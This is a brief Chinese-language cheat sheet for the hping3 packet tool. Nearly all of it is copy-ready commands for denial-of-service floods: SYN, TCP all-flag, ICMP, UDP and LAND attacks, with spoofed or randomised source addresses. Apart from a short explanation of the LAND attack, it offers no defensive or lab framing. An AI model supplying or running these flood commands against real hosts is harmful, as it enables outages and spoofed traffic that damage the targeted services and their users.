# hping3工具

## 使用

    hping3 host [options]

Syn Flood攻击

    hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source 1.1.1.1
    hping3 -S -P -U -p 80 --flood --rand-source 1.1.1.1

TCP Flood攻击

    hping3 -SARFUP -p 80 --flood --rand-source 1.1.1.1

ICMP Flood攻击

    hping3 -q -n -a 1.1.1.1 --icmp -d 56 --flood 1.1.1.1

UDP Flood攻击

    hping3  -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood 1.1.1.2

LAND攻击

特殊种类的Syn Flood攻击，源地址和目的地址都是目标机器，目标机器和自己完成三次握手。

    hping3 -n -a 1.1.1.1 -S -d 100 -p 80 --flood 1.1.1.1

